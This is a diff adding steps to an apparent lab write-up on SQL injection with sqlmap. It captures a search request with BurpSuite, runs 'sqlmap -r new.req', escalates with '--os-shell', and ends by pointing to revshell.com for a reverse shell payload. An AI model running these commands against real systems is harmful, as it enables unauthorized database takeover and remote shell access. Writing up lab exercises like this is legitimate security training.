@@ -74,3 +74,33 @@ Let's use the **sqlmap** for this lab.
 https://github.com/sqlmapproject/sqlmap.git
 
 Automatic SQL injection and database takeover tool
+
+![image](https://user-images.githubusercontent.com/99097743/169881600-07143523-6f87-4718-8a3c-f4e193bf331a.png)
+
+Here are the steps:
+
+
+1. Capture the GET file of a sample search with BurpSuite as **new.req**
+
+![image](https://user-images.githubusercontent.com/99097743/169882864-38319cd4-af40-4ee0-b1c7-f196263b2886.png)
+
+
+2. Run the **sqlmap** tool
+
+```sh
+sqlmap -r new.req
+```
+* -r means REQUESTFILE: Load HTTP request from a file
+
+![image](https://user-images.githubusercontent.com/99097743/169883168-7c07a0ba-86fd-4f12-afeb-2c924713107e.png)
+
+3. Run the **--os-shell** command
+
+```sh
+sqlmap -r new.req --os-shell
+```
+* --os-shell means prompt for an interactive operating system shell
+*  If asked "Do you want to retrieve the command standard output? [Y/n/a]" --> Click a = ALWAYS
+
+4. Get the reverse shell payload, revshell.com can help us here
+
